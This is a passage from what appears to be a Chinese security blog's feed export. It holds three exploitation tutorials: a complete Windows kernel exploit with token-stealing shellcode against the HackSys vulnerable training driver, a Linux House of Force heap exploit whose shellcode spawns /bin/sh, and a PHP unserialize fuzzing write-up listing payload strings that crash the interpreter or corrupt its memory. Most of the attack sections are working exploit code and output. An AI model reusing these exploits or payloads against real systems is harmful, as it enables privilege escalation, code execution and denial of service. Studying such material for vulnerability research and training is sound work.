HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>字符串生成可以借助immunity debugger的<code>!mona pc 3056</code>命令或者可以利用kali的patter_create.rb脚本来生成，非常方便。<br>之后编译运行poc，windbg捕获到异常。<br><img src="/img/1.png" alt="image"><br>可以看到eip寄存器的值为72433372，然后利用patter_offset.rb来确定这个值的位置在哪里即可，确定offset为2080，之后的4个字节的地址只要覆盖为shellcode的地址，一切都OK了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line">#include &quot;stdafx.h&quot;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;Windows.h&gt;</div><div class="line">#include &lt;winioctl.h&gt;</div><div class="line">#include &lt;TlHelp32.h&gt;</div><div class="line"></div><div class="line">#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\</div><div class="line">    METHOD_NEITHER, FILE_ANY_ACCESS)</div><div class="line"></div><div class="line">#define KTHREAD_OFFSET  0x124</div><div class="line">#define EPROCESS_OFFSET 0x044</div><div class="line">#define PID_OFFSET        0x084</div><div class="line">#define FLINK_OFFSET    0x088</div><div class="line">#define TOKEN_OFFSET    0x0c8</div><div class="line">#define SYSTEM_PID      0x004</div><div class="line"></div><div class="line">VOID TokenStealingShellcodeWin() &#123;</div><div class="line">    __asm &#123;</div><div class="line">        pushad</div><div class="line"></div><div class="line">        mov eax, fs:[KTHREAD_OFFSET]</div><div class="line">        mov eax, [eax + EPROCESS_OFFSET]</div><div class="line"></div><div class="line">        mov ecx, eax</div><div class="line">        mov ebx, [eax + TOKEN_OFFSET]</div><div class="line">        mov edx, SYSTEM_PID</div><div class="line"></div><div class="line">        SearchSystemPID :</div><div class="line">        mov eax, [eax + FLINK_OFFSET]</div><div class="line">            sub eax, FLINK_OFFSET</div><div class="line">            cmp[eax + PID_OFFSET], edx</div><div class="line">            jne SearchSystemPID</div><div class="line"></div><div class="line">            mov edx, [eax + TOKEN_OFFSET]</div><div class="line">            mov[ecx + TOKEN_OFFSET], edx</div><div class="line"></div><div class="line">            popad</div><div class="line"></div><div class="line">            ; recovery</div><div class="line">            xor eax, eax; set NTSTATUS SUCEESS</div><div class="line">            add esp, 12; fix stack</div><div class="line">            pop ebp</div><div class="line">            ret 8</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int _tmain(int argc, _TCHAR* argv[]) &#123;</div><div class="line"></div><div class="line">    DWORD lpBytesReturned;</div><div class="line">    PVOID pMemoryAddress = NULL;</div><div class="line">    LPCSTR lpDeviceName = (LPCSTR) &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;;</div><div class="line"></div><div class="line">    printf(&quot;Getting the device handle\r\n&quot;);</div><div class="line">    HANDLE hDriver = CreateFileA(lpDeviceName,</div><div class="line">        GENERIC_READ | GENERIC_WRITE,</div><div class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE,</div><div class="line">        NULL,</div><div class="line">        OPEN_EXISTING,</div><div class="line">        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</div><div class="line">        NULL);</div><div class="line">    if (hDriver == INVALID_HANDLE_VALUE) &#123;</div><div class="line">        printf(&quot;Failed to get device handle : (0x%X\r\n)&quot;, GetLastError());</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    printf(&quot;Got the device Handle : 0x%X\r\n&quot;, hDriver);</div><div class="line">    printf(&quot;Allocating Memory For Input Buffer\r\n&quot;);</div><div class="line">    printf(&quot;\t[*]Payload is at : %p\n&quot;, TokenStealingShellcodeWin);</div><div class="line"> </div><div class="line">    CHAR *chBuffer = (CHAR*)malloc(2084);</div><div class="line">    printf(&quot;\t[*]Buffer is at : %p\n&quot;, &amp;chBuffer);</div><div class="line"></div><div class="line">    memset(chBuffer, 0x41, 2048);</div><div class="line">    memset(chBuffer + 2048, 0x42, 32);</div><div class="line">    chBuffer[2080] = (DWORD)&amp;TokenStealingShellcodeWin &amp; 0x000000FF;</div><div class="line">    chBuffer[2080 + 1] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0x0000FF00) &gt;&gt; 8;</div><div class="line">    chBuffer[2080 + 2] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0x00FF0000) &gt;&gt; 16;</div><div class="line">    chBuffer[2080 + 3] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0xFF000000) &gt;&gt; 24;</div><div class="line"></div><div class="line"></div><div class="line">    printf(&quot;Send IOCTL request\r\n&quot;);</div><div class="line"></div><div class="line">    DeviceIoControl(hDriver,</div><div class="line">        HACKSYS_EVD_IOCTL_STACK_OVERFLOW,</div><div class="line">        chBuffer,</div><div class="line">        2084,</div><div class="line">        NULL,</div><div class="line">        0,</div><div class="line">        &amp;lpBytesReturned,</div><div class="line">        NULL);</div><div class="line"></div><div class="line">    system(&quot;cmd.exe&quot;);</div><div class="line">    printf(&quot;IOCTL request completed,cleaning up da heap.\r\n&quot;);</div><div class="line">  </div><div class="line">    CloseHandle(hDriver);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译运行上面的代码，就可以成功进行提权操作。<br><img src="/img/2.png" alt="image"></p>
<p><img src="/img/3.png" alt="image"></p>
<p>shellcode的分析我附上参考链接就行了，写的非常好，从中能够学到很多东西，不过我觉得先学习windows编程挺有必要的。</p>
<p>参考链接\<br><a href="http://www.hacking-training.com/download/WKE.pdf\" target="_blank" rel="external">http://www.hacking-training.com/download/WKE.pdf\</a><br><a href="https://zhuanlan.zhihu.com/p/26059211\" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/26059211\</a><br><a href="http://www.tuicool.com/articles/reeqaa6" target="_blank" rel="external">http://www.tuicool.com/articles/reeqaa6</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux堆溢出利用]]></title>
      <url>http://yoursite.com/2017/05/24/linux%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>The House of Fource</p>
<p>vuln.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt; </div><div class="line"></div><div class="line">int main(int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">        char *buf1, *buf2, *buf3;</div><div class="line">        if (argc != 4) &#123;</div><div class="line">                printf(&quot;Usage Error\n&quot;);</div><div class="line">                return;</div><div class="line">        &#125;</div><div class="line">        /* [1] */</div><div class="line">        buf1 = malloc(256);</div><div class="line">        /* [2] */</div><div class="line">        strcpy(buf1, argv[1]); /* Prereq 1 */</div><div class="line">        /* [3] */</div><div class="line">        buf2 = malloc(strtoul(argv[2], NULL, 16)); /* Prereq 2 */</div><div class="line">        /* [4] */</div><div class="line">        buf3 = malloc(256); /* Prereq 3 */</div><div class="line">        /* [5] */</div><div class="line">        strcpy(buf3, argv[3]); /* Prereq 3 */</div><div class="line"></div><div class="line">        /* [6] */</div><div class="line">        free(buf3);</div><div class="line">        free(buf2);</div><div class="line">        free(buf1);</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>exp.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">#define VULNERABLE &quot;./vuln&quot;</div><div class="line">#define FREE_ADDRESS 0x08049858-0x8</div><div class="line">#define MALLOC_SIZE &quot;0xFFFFF744&quot;</div><div class="line">#define BUF3_USER_INP &quot;\x08\xa0\x04\x08&quot;</div><div class="line"></div><div class="line">/* Spawn a shell. Size - 25 bytes. */</div><div class="line">char scode[] =</div><div class="line">        &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;</div><div class="line"></div><div class="line">int main( void )</div><div class="line">&#123;       </div><div class="line">        int i;</div><div class="line">        char * p;</div><div class="line">        char argv1[ 265 ];</div><div class="line">        char * argv[] = &#123; VULNERABLE, argv1, MALLOC_SIZE, BUF3_USER_INP, NULL &#125;;</div><div class="line"></div><div class="line">        strcpy(argv1,scode);</div><div class="line">        for(i=25;i&lt;260;i++)</div><div class="line">                argv1[i] = &apos;A&apos;;</div><div class="line"></div><div class="line">        strcpy(argv1+260,&quot;\xFF\xFF\xFF\xFF&quot;); /* Top chunk size */</div><div class="line">      </div><div class="line"></div><div class="line">        /* Execution of the vulnerable program */</div><div class="line">        execve( argv[0], argv, NULL );</div><div class="line">        return( -1 );</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>最终得到shell</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Fuzzing unserialize]]></title>
      <url>http://yoursite.com/2017/04/29/Fuzzing-unserialize/</url>
      <content type="html"><![CDATA[<p>在PHP中从反序列化用户输入的数据是危险的，原因如下：<br>众所周知，反序列化的类的方法可以被调用（<a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf" target="_blank" rel="external">PHP应用程序中的ROP</a>）。<br>可以在几乎任意的位置设置引用（通常导致释放重引用漏洞）。<br>可以在序列化字符串中定义变量的类型（如果内部类对属性类型做出错误的假设，则可能导致类型混淆）。</p>
<p><strong>Unserialize Syntax</strong></p>
<p>在实现fuzzer之前，必须了解PHP序列化的语法。有12个不同的符号，每个符号用于一种数据类型和用例。以下代码显示了可以在PHP的源代码中找到的切换表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&quot;/ext/standard/var_unserializer.c&quot;</div><div class="line">[...]</div><div class="line">switch (yych) &#123;</div><div class="line">    case &apos;C&apos;:</div><div class="line">    case &apos;O&apos;:	goto yy13;</div><div class="line">    case &apos;N&apos;:	goto yy5;</div><div class="line">    case &apos;R&apos;:	goto yy2;</div><div class="line">    case &apos;S&apos;:	goto yy10;</div><div class="line">    case &apos;a&apos;:	goto yy11;</div><div class="line">    case &apos;b&apos;:	goto yy6;</div><div class="line">    case &apos;d&apos;:	goto yy8;</div><div class="line">    case &apos;i&apos;:	goto yy7;</div><div class="line">    case &apos;o&apos;:	goto yy12;</div><div class="line">    case &apos;r&apos;:	goto yy4;</div><div class="line">    case &apos;s&apos;:	goto yy9;</div><div class="line">    case &apos;&#125;&apos;:	goto yy14;</div><div class="line">    default:	goto yy16;</div><div class="line">&#125;</div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>因此，下表显示了所有符号及其含义。对于了解PHP的变量如何工作是有帮助的 .<a href="http://note.youdao.com/" target="_blank" rel="external">PHP Internals Book – Basic zval structure</a></p>
<p><strong> Unserialize data types</strong></p>
<table>
<thead>
<tr>
<th>Symbol</th>
<th>Data Type</th>
<th>Description</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>N</td>
<td>null</td>
<td>NULL值</td>
<td>N;</td>
</tr>
<tr>
<td>b</td>
<td>bool</td>
<td>该值可以是true（1）或false（0）</td>
<td>b:1;</td>
</tr>
<tr>
<td>i</td>
<td>int</td>
<td>数字型的值</td>
<td>i:1337;</td>
</tr>
<tr>
<td>d</td>
<td>double</td>
<td>值可以作为普通浮动值或E值提供。（例如1.234E + 20）。有三个特殊值：INF，-INF，NAN</td>
<td>d:1.337;d:1.3333333E+20</td>
</tr>
<tr>
<td>s</td>
<td>string</td>
<td>序列化字符串包含字符串长度和由双引号括起来的实际字符串</td>
<td>s:4:”meow”;</td>
</tr>
<tr>
<td>S</td>
<td>encoded string</td>
<td>编码的字符串与普通字符串非常相似。不同之处在于字符可以是十六进制编码的：A=\x41。这种类型允许使串行字符串可打印，并且在服务器拒绝某些字符的情况下非常有用</td>
<td>S:5:”me\00ow”;</td>
</tr>
<tr>
<td>a</td>
<td>array</td>
<td>首先定义数组大小。实际内容保留在{}之间，必须作为键值对提供。.</td>
<td>a:1:{i:0;s:5:”value”;}</td>
</tr>
<tr>
<td>O</td>
<td>Object</td>
<td>对象在开始后面跟着属性定义。与数组类似，这里需要键值对。属性可以是公共的，私有的或受保护的。公共属性只需要设置实际的属性名称。对于私有和静态属性，一些额外的信息必须是前缀:以下列表显示了一个名为test的属性是如何针对不同的可见性编码的: public: test private:\x00Classname\x00test protected:\x00*\x00test</td>
<td>O:8:”stdClass”:1:{s:4:”test”;i:123;}</td>
</tr>
<tr>
<td>C</td>
<td>Custom Object</td>
<td>几个类使用自定义unserializer并且需要使用C符号。类似于普通对象，首先定义类名，后跟自定义的序列化字符串。与普通对象相反，自定义内容之前的数字定义了自定义内容的长度，而不是属性的数量</td>
<td>C:11:”ArrayObject”:21:{x:i:0;a:0:{};m:a:0:{}}</td>
</tr>
<tr>
<td>r</td>
<td>reference</td>
<td>对序列化字符串中存在值的引用。</td>
<td>r:1;</td>
</tr>
<tr>
<td>R</td>
<td>reference</td>
<td>对序列化字符串中存在值的引用。设置zval的is_reference属性</td>
<td>R:1;</td>
</tr>
<tr>
<td>o</td>
<td>wtf object</td>
<td>小写字母o的作用不清楚。它表示一个对象，但不可能设置类名（默认为stdClass）。样本中的错放’’不是错别字。</td>
<td>o:1:”s:4:”prop”;i:1;}</td>
</tr>
</tbody>
</table>
<p>每个反序列化后的值都有一个可由r和R引用的索引。第一个元素（外部数组或对象）具有键1.引用使用大写字母R和任何类型的键（数组键和属性名称）的引用不会增加索引。键和属性名称可以是i，s和S。PHP的unserializer的语法非常严格。如果单个字符不合法，该函数会中止解析器，并且不返回任何内容。我必须确保Fuzzer没有产生无效的测试样本以获得最佳效率。</p>
<p><strong>Fuzzing Unserialize</strong></p>
<p>一个好的fuzzer应该能够生成任何语法正确的有效载荷。我决定忽略解析器错误，并专注于查找变量和引用的不正确处理。不幸的是，PHP的serialize（）不能产生任意输出。例如，不可能在序列化字符串中定义相同的数组键两次。也不能在任意位置放置任意引用。这就是为什么我实现了一个能够让我构建任何我想要的自定义序列化程序。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$o = new O(&quot;stdClass&quot;);</div><div class="line">$o-&gt;set(&quot;prop&quot;, new I(1335));</div><div class="line">$array = new A();</div><div class="line">$array-&gt;set(123, new S(&quot;meow&quot;));</div><div class="line">$array-&gt;set(123, new PRef($array));</div><div class="line">$array-&gt;set(1, $o);</div><div class="line">echo $array;</div><div class="line"></div><div class="line">/*</div><div class="line">Result:</div><div class="line">a:3:&#123;i:123;s:4:&quot;meow&quot;;i:123;R:1;i:1;O:8:&quot;stdClass&quot;:1:&#123;s:4:&quot;prop&quot;;i:1335;&#125;&#125;</div><div class="line">*/</div></pre></td></tr></table></figure>
<p>从这里我只需从PHP的源代码获取内部类及其属性的列表。现在我可以生成随机样本并将其传递给unserialize，以便（希望）触发意外的行为。</p>
<p><strong>Unexpected Behavior</strong></p>
<p>你可以认为，PHP的反序列化中的内存损坏实际上是预期的行为，因为每个人都知道该函数的历史。然而，以下事件表明在非序列化过程中出现了错误：</p>
<p>Segmentation fault:</p>
<p>最明显的事件是段错误，可以通过检查进程的返回码来轻松检测。</p>
<p>PHP prints zend_mm_heap_corrupted:</p>
<p>PHP使用自己的内存管理器进行分配。如果分配器检测到堆上的损坏，则会打印相应的消息。</p>
<p>＆UNKNOWN;：</p>
<p>值的类型存储在zval结构中，可以是0到10之间的数字。例如，类型1表示整数，类型6用于字符串。当使用var_dump打印的变量具有未知类型（不在0-10范围内）时，将打印字符串“＆UNKNOWN”。这表示内存损坏，因为通常无法制作PHP不知道的数据类型<br>。<br>Crafted integer zval:</p>
<p>在PHP 5.6中，zval结构体的大小为24字节。如果这个结构完全用\x01填充，结果值是一个整数，值为72340172838076673。我让fuzzer在测试用例中放置了由\x01组成的24字节长字符串。所得到的反序列化数据中存在72340172838076673，表明已经发现并成功利用了释放重用漏洞。</p>
<p>Incorrect return value:</p>
<p>fuzzer总是使用一个数组作为外部元素，导致两个反序列化可能的返回数据类型：“array”，当没有错误发生时，或者“NULL”也许是输入不满足反序列化。不同于array或null的数据类型出现则意味着不可预期的事情发生了。</p>
<p>Post-unserialize allocation:</p>
<p>在unserializing和var_dump之间定义的变量的出现最有可能是一个释放重用漏洞的一个标志。</p>
<p><strong>Test Cases</strong></p>
<p>考虑到可能出现的不同行为，我设计了以相同有效载荷一个接一个地执行的以下测试用例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"> Unserialize only:</div><div class="line"> </div><div class="line">此测试用例不会对所提供的序列化字符串进行排序。</div><div class="line"> Unserialize var_dump:</div><div class="line"> </div><div class="line"> 这里，字符串是反序列化的，结果中的每个值都通过var_dump进行访问和打印</div><div class="line"> </div><div class="line"> Unserialize unserialize var_dump:</div><div class="line"> </div><div class="line"> 添加了第二个unserialize。其目的是增加最初的unserialize之后的内存操作量。</div><div class="line"> </div><div class="line"> Unserialize alloc var_dump:</div><div class="line"> </div><div class="line"> 这里，字符串是反序列化的，一些修复值分配给变量，最后打印反序列化的结果。</div></pre></td></tr></table></figure>
<p>所有测试用例都是必需的，因为错误可能发生在不同的阶段（例如PHP引擎的反序列化，打印或关闭）。通过查看不同测试用例的结果，还可以确定错误发生的位置（如果有的话）。</p>
<p><strong>Calibration and Tests</strong></p>
<p>在运行fuzzer之前，我查看了一些旧的unserialize错误的PoC，以确保我没有错过任何东西。停止Fuzzer后几乎覆盖了过去的一切。针对旧的PHP版本的第一个测试产生比内核可以处理的更多的segfaults。针对最近的PHP 7版本的第二个测试也很快地吐出了结果。不幸的是，这是一个非常不可靠的错误，尚未进一步调查。针对PHP 5.6.21的第一次测试只会导致一些本文后面描述的差劲DoS错误。</p>
<p><strong>Findings</strong><br>fuzzer的第一个版本记录了所有测试用例的序列化字符串和var_dump输出，最终非常快地填充了我的硬盘驱动器。它花了一些时间，对fuzzer做了调整直到意外的行为被检测到。最后，在设置了一个体面的模糊深度并生成大约1-2M的大样本后，我发现了意想不到的行为。这里有趣的是，它没有可靠地发生，并且取决于在反序列化字符串之前或之前分配了多少对象。与evonide一起，我们发现所需的对象数量是大约10000.在排除不相关的类后，我终于设法得到一个只有大约1000个字节的工作测试用例。经过一些更多的工作，我终于制作了最小的测试用例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">$serialized_string = &apos;a:1:&#123;i:0;a:3:&#123;i:1;N;i:2;O:10:&quot;ZipArchive&quot;:1:&#123;s:8:&quot;filename&quot;;i:1337;&#125;i:1;R:5;&#125;&#125;&apos;;</div><div class="line">$array = unserialize($serialized_string);</div><div class="line">gc_collect_cycles();</div><div class="line">$filler1 = &quot;aaaa&quot;;</div><div class="line">$filler2 = &quot;bbbb&quot;;</div><div class="line">var_dump($array[0]);</div><div class="line"></div><div class="line">/*</div><div class="line">Result:</div><div class="line">array(2) &#123;</div><div class="line"> [1]=&gt;</div><div class="line"> string(4) &quot;bbbb&quot;</div><div class="line"> [2]=&gt;</div><div class="line"> object(ZipArchive)#1 (5) &#123;</div><div class="line"> [&quot;status&quot;]=&gt;</div><div class="line"> int(0)</div><div class="line"> [&quot;statusSys&quot;]=&gt;</div><div class="line"> int(0)</div><div class="line"> [&quot;numFiles&quot;]=&gt;</div><div class="line"> int(0)</div><div class="line"> [&quot;filename&quot;]=&gt;</div><div class="line"> string(0) &quot;&quot;</div><div class="line"> [&quot;comment&quot;]=&gt;</div><div class="line"> string(0) &quot;&quot;</div><div class="line"> &#125;</div><div class="line">&#125;</div><div class="line">*/</div></pre></td></tr></table></figure>
<p>不幸的是，不能保证ZipArchive存在于目标系统上，因为某些发行版是可选的。所以我继续fuzzing，并且包括了示例中触发第一个bug所需的对象/数组的数量。我几乎瞬间发现了另一个错误。类似于第一个测试用例，我必须最小化一个500kb的样本，然后再继续。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$serialized_string = &apos;a:1:&#123;i:1;C:11:&quot;ArrayObject&quot;:37:&#123;x:i:6;a:2:&#123;i:1;R:4;i:2;r:1;&#125;;m:a:0:&#123;&#125;&#125;&#125;&apos;;</div><div class="line">$array = unserialize($serialized_string);</div><div class="line">gc_collect_cycles();</div><div class="line">$filler1 = &quot;aaaa&quot;;</div><div class="line">$filler2 = &quot;bbbb&quot;;</div><div class="line">var_dump($array);</div><div class="line"></div><div class="line">/*</div><div class="line">Result:</div><div class="line">string(4) &quot;bbbb&quot;</div><div class="line">*/</div></pre></td></tr></table></figure>
<p><strong>Bonus Round</strong></p>
<p>Unserialize仍然充斥着bug。这里有一些字符串导致-让我们说-“问题”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// php 5.x, 7.x</div><div class="line">O:9:&quot;SoapFault&quot;:1:&#123;s:11:&quot;faultstring&quot;;r:1;&#125;</div><div class="line">// php 7.x (5.x with var_dump)</div><div class="line">C:3:&quot;GMP&quot;:23:&#123;s:1:&quot;2&quot;;a:1:&#123;i:46;R:1;&#125;&#125;</div><div class="line">// php 5.x, 7.x</div><div class="line">O:9:&quot;Exception&quot;:1:&#123;S:19:&quot;\00Exception\00previous&quot;;r:1;&#125;</div><div class="line">// php 7.x</div><div class="line">a:1:&#123;i:0;O:9:&quot;Exception&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:5:&quot;aaaaa&quot;;S:17:&quot;\00Exception\00string&quot;;O:8:&quot;stdClass&quot;:1:&#123;S:1:&quot;a&quot;;O:12:&quot;DateInterval&quot;:1:&#123;s:14:&quot;special_amount&quot;;R:2;&#125;&#125;&#125;&#125;</div></pre></td></tr></table></figure>
<p>前两个错误导致堆栈溢出并且段错误，第三个有效载荷消耗“一些”CPU资源，最后一个是中间-反序列化类型混淆。<br>通过使用wakeup方法的自定义类可以触发另一个错误。每次该对象被反序列化时__wakeup都将被调用。在这个例子中，属性kiri是一个通过设置$this-&gt;kiri来破坏外部数组的引用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">class hara &#123;</div><div class="line">	function __wakeup() &#123;</div><div class="line">		$this-&gt;kiri = 123;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">$bad = &apos;a:2:&#123;i:0;O:4:&quot;hara&quot;:1:&#123;s:4:&quot;kiri&quot;;R:1;&#125;i:0;i:1;&#125;&apos;;</div><div class="line">$f = unserialize($bad);</div><div class="line">var_dump($f);</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1、字符串被传递到unserialize。</div><div class="line">2、一旦找到该对象的关闭&#125;，就调用该对象的wakeup方法。</div><div class="line">3、wakeup方法会破坏外部数组。</div><div class="line">4、unserializer尝试将对象添加到数组。不幸的是，这个数组已经被破坏了。</div><div class="line">5、应用程序崩溃。</div></pre></td></tr></table></figure>
<p>当一个值分配给一个属性时，内部函数  zend_std_write_property最终到达。这里，旧数据的zval被复制到一个临时的zval中。这个临时的zval被传递给zval_dtor，实际的内容被破坏。在我们的示例中，zval表示外部数组，并包含指向HashTable的指针。zval_dtor没有做任何refcounter检查，毫无犹豫的释放HashTable。不幸的是，unserialize仍然在这个HashTable上运行，并且一旦wakeup函数返回就会崩溃。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&quot;/Zend/zend_object_handlers.c&quot;</div><div class="line">[...]</div><div class="line">ZEND_API void zend_std_write_property(zval *object, zval *member, zval *value, const zend_literal *key TSRMLS_DC) /* &#123;&#123;&#123; */</div><div class="line">&#123;</div><div class="line">[...]</div><div class="line">    if (PZVAL_IS_REF(*variable_ptr)) &#123;</div><div class="line">        zval garbage = **variable_ptr; /* old value should be destroyed */</div><div class="line"></div><div class="line">        /* To check: can&apos;t *variable_ptr be some system variable like error_zval here? */</div><div class="line">        Z_TYPE_PP(variable_ptr) = Z_TYPE_P(value);</div><div class="line">        (*variable_ptr)-&gt;value = value-&gt;value;</div><div class="line">        if (Z_REFCOUNT_P(value) &gt; 0) &#123;</div><div class="line">            zval_copy_ctor(*variable_ptr);</div><div class="line">        &#125; else &#123;</div><div class="line">            efree(value);</div><div class="line">        &#125;</div><div class="line">        zval_dtor(&amp;garbage);</div><div class="line">    &#125;</div><div 